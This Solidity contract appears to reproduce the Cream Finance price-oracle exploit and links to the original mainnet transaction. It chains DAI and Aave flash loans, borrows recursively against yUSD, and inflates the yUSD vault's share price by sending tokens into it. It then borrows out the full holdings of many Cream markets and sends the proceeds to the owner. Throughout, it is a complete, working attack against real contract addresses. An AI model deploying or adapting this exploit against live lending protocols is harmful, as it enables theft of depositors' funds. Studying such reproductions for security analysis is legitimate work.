pragma solidity >=0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "hardhat/console.sol";
import "./ContractB.sol";

//tx: https://etherscan.io/tx/0x0fe2542079644e107cbf13690eb9c2c65963ccb79089ff96bfaf8dced2331c92

interface IDaiFlashloan {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IYearnVault {
    function deposit(uint amount) external;
    function withdraw(uint amount) external;
    function pricePerShare() external view returns(uint256);
    function totalAssets() external view returns(uint);
}

interface ICurveDepositor {
    function add_liquidity(uint256[4] memory amounts, uint256 min_mint_amount) external;
    function remove_liquidity_one_coin(uint256 _token_amount, int128 i, uint256 min_uamount, bool donate_dust) external;
}

interface ICurvePool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface IWrappedNative {
    function withdraw(uint amount) external;
    function deposit() external payable;
}

contract ContractA is Ownable {

    IDaiFlashloan private constant  daiFlashloanLender = IDaiFlashloan(0x1EB4CF3A948E7D72A198fe073cCb8C7a948cD853);
    IAaveFlashloan private constant aaveFlashLoanLender = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    IERC20 private constant dai  = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address private constant ydai = 0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01;
    address private constant curveDepositor = 0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3;
    address private constant curveDepositToken = 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8;
    address private constant yusd = 0x4B5BfD52124784745c1071dcB244C6688d2533d3;
    address private constant cryusd = 0x4BAa77013ccD6705ab0522853cB0E9d453579Dd4;
    address private constant crdai = 0x92B767185fB3B04F881e3aC8e5B0662a027A1D9f;
    address private constant crusdt = 0x797AAB1ce7c01eB727ab980762bA88e7133d2157;
    address private constant crusdc = 0x44fbeBd2F576670a6C33f6Fc0B00aA8c5753b322;
    address private constant crcreth2 = 0xfd609a03B393F1A1cFcAcEdaBf068CAD09a924E2;
    address private constant crfei = 0x8C3B7a4320ba70f8239F83770c4015B5bc4e6F91;
    address private constant crftt = 0x10FDBD1e48eE2fD9336a482D746138AE19e649Db;
    address private constant crperp = 0x299e254A8a165bBeB76D9D69305013329Eea3a3B;
    address private constant crrune = 0x8379BAA817c5c5aB929b03ee8E3c48e45018Ae41;
    address private constant crdpi = 0x2A537Fa9FFaea8C1A41D3C2B68a9cb791529366D;
    address private constant cruni = 0xe89a6D0509faF730BD707bf868d9A2A744a363C7;
    address private constant crgno = 0x523EFFC8bFEfC2948211A05A905F761CBA5E8e9E;
    address private constant creth = 0xD06527D5e56A3495252A528C4987003b712860eE;
    address private constant crsteth = 0x1F9b4756B008106C806c7E64322d7eD3B72cB284;
    address private constant comptroller = 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258;

    address private constant uniswapV2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant y3crv = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;

    ContractB private immutable contractb;
    uint private immutable daiBorrowed;
    uint private immutable ethBorrowed;
    uint private startYusd;
    uint private ethToRepay;
    uint private daiToRepay;

    constructor() public {
        contractb = new ContractB();

        //tell cream we want to borrow against yusd;
        address[] memory markets = new address[](1);
        markets[0] = cryusd;
        IComptroller(comptroller).enterMarkets(markets);

        daiBorrowed = 500000000000000000000000000;
        ethBorrowed = 524102159298234706604104;
    }
    

    receive() external payable {}
    fallback() external payable {}

    function heist() public {
        daiFlashloan();
        console.log("repaid dai loan");
    }

    function daiFlashloan() internal {
        daiFlashloanLender.flashLoan(address(this), address(dai), daiBorrowed, new bytes(0));
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        console.log("dai borrowed: %s", dai.balanceOf(address(this)));
        daiToRepay = amount + fee + 1;
        etherFlashLoan();
        console.log("repaid eth loan");
        dai.approve(msg.sender, daiToRepay);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function etherFlashLoan() internal {
        address[] memory assets = new address[](1);
        assets[0] = address(weth);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = ethBorrowed;

        uint256[] memory modes = new uint256[](1);

        aaveFlashLoanLender.flashLoan(address(this), assets, amounts, modes, address(this), new bytes(0), 0);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool){
        console.log("Weth borrowed: %s", weth.balanceOf(address(this)));
        ethToRepay = amounts[0] + premiums[0] + 1 ether;
        beginHeist();
        console.log(assets[0]);
        IERC20(assets[0]).approve(address(aaveFlashLoanLender), ethToRepay);
        return true;
        //weth.approve(msg.sender, ethToRepay);
    }

    function beginHeist() internal {
        console.log("phase 1 : Acquire Capital");
        depositIntoYusd();
        depositCryusd();
        withdrawNative();
        depositEthBorrowYusd();

        console.log("Phase 2 : Recursion");
        depositCryusd();
        depositEthBorrowYusd();
        depositCryusd();
        depositEthBorrowYusd();

        console.log("Phase 3 : Inflation");
        withdrawYusdAndInflate();

        console.log("Phase 4 : Smash and Grab");
        borrowAll();

        console.log("Phase 5 : Repayment");
        console.log("EthToRepay: %s", ethToRepay);
        console.log("DaiToRepay: %s", daiToRepay);
        withdrawToDai();
        depositToWeth();
        swapToUsd();
        swapUsdToDai();

    }

    function depositIntoYusd() internal {
        //dai to y4-curve
        startYusd = IYearnVault(yusd).totalAssets();
        uint amount = dai.balanceOf(address(this));
        dai.approve(curveDepositor, amount);
        uint[4] memory amounts = [amount, 0, 0, 0];
        ICurveDepositor(curveDepositor).add_liquidity(amounts, 1);
        console.log("curveDepositToken recieved: %s", IERC20(curveDepositToken).balanceOf(address(this)));

        //y4curve - yusd
        amount = IERC20(curveDepositToken).balanceOf(address(this));
        IERC20(curveDepositToken).approve(yusd, amount);
        IYearnVault(yusd).deposit(amount);
        console.log("yusd recieved: %s", IERC20(yusd).balanceOf(address(this)));
    }

    function depositCryusd() internal {
        uint amount = IERC20(yusd).balanceOf(address(this));
        IERC20(yusd).approve(cryusd, amount);
        ICrToken(cryusd).mint(amount);
        console.log("cryusd recieved: %s", IERC20(cryusd).balanceOf(address(this)));
    }

    function withdrawNative() internal {
        uint amount = weth.balanceOf(address(this));
        IWrappedNative(address(weth)).withdraw(amount);
    }

    function depositEthBorrowYusd() internal {
        console.log("yusd start: %s", IERC20(yusd).balanceOf(address(this)));
        uint amount = address(this).balance;
        contractb.depositAndBorrow{value:amount}();
        console.log("yusd recieved: %s", IERC20(yusd).balanceOf(address(this)));
    }

    function withdrawYusdAndInflate() internal {
        console.log("pricepershare start : %s", IYearnVault(yusd).pricePerShare());
        uint amount = IERC20(yusd).balanceOf(address(this));
        IYearnVault(yusd).withdraw(amount);
        console.log("curveDepositToken recieved: %s", IERC20(curveDepositToken).balanceOf(address(this)));
        console.log("curveDepositToken vault: %s", IERC20(curveDepositToken).balanceOf(yusd));

        //Inflate vault
        IERC20(curveDepositToken).transfer(yusd, startYusd);
        console.log("curveDepositToken vault: %s", IERC20(curveDepositToken).balanceOf(yusd));
        console.log("pricepershare end : %s", IYearnVault(yusd).pricePerShare());
    }

    function borrowAllEth() internal {
        ICether(creth).borrow(creth.balance);
        console.log("eth recieved: %s", address(this).balance);
    }

    function borrowTokens(address market) internal {
        address underlying = ICrToken(market).underlying();
        uint borrowAmount = IERC20(underlying).balanceOf(market);
        console.log("asset : %s", underlying);

        try ICrToken(market).borrow(borrowAmount) {       
            console.log("borrowed: %s", IERC20(underlying).balanceOf(address(this)));
        }
        catch {
            console.log("skipped");
        }
    }

    function borrowAll() internal {
        borrowAllEth();
        borrowTokens(crdai);
        borrowTokens(crusdc);
        borrowTokens(crusdt);
        borrowTokens(crfei);
        borrowTokens(crcreth2);
        borrowTokens(crftt);
        borrowTokens(crperp);
        borrowTokens(crrune);
        borrowTokens(crdpi);
        borrowTokens(cruni);
        borrowTokens(crgno);
    }

    function withdrawToDai() internal {
        uint amount = IERC20(curveDepositToken).balanceOf(address(this));
        IERC20(curveDepositToken).approve(curveDepositor, amount);
        ICurveDepositor(curveDepositor).remove_liquidity_one_coin(amount, 0, 1, false);
        console.log("dai balance: %s", IERC20(dai).balanceOf(address(this)));
    }

    function depositToWeth() internal {
        IWrappedNative(address(weth)).deposit{value: address(this).balance}();
        console.log("weth balance: %s", IERC20(weth).balanceOf(address(this)));
    }

    function swapToUsd() internal {
        uint extra = IERC20(weth).balanceOf(address(this)) - ethToRepay;

        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = ICrToken(crusdc).underlying(); 

        uint amount = extra / 10;
        weth.approve(uniswapV2, extra);
        IUniswapV2Router02(uniswapV2).swapExactTokensForTokens(amount * 8, 1, path, address(this), block.timestamp);

        path[1] = address(dai); 
        IUniswapV2Router02(uniswapV2).swapExactTokensForTokens(amount, 2, path, address(this), block.timestamp);
        console.log("weth balance: %s", IERC20(weth).balanceOf(address(this)));
    }

    function swapUsdToDai() internal {
        address token = ICrToken(crusdc).underlying();
        uint amount = IERC20(token).balanceOf(address(this));
        IERC20(token).approve(y3crv, amount);
        ICurvePool(y3crv).exchange(1, 0, amount, 1);
        console.log("dai balance: %s", IERC20(dai).balanceOf(address(this)));
    }

    function withdrawProfits() public {
        console.log("Final Phase: Send Profits To Owner");
        payable(owner()).transfer(address(this).balance);
        withdrawUnderlying(crdai);
        withdrawUnderlying(crusdc);
        withdrawUnderlying(crusdt);
        withdrawUnderlying(crfei);
        withdrawUnderlying(crcreth2);
        withdrawUnderlying(crftt);
        withdrawUnderlying(crperp);
        withdrawUnderlying(crrune);
        withdrawUnderlying(crdpi);
        withdrawUnderlying(cruni);
        withdrawUnderlying(crgno);
    }

    function withdrawUnderlying(address token) internal {
        address underlying = ICrToken(token).underlying();
        transferToken(underlying);
    }
    function transferToken(address token) public {
        IERC20(token).transfer(owner(), IERC20(token).balanceOf(address(this)));
    }
}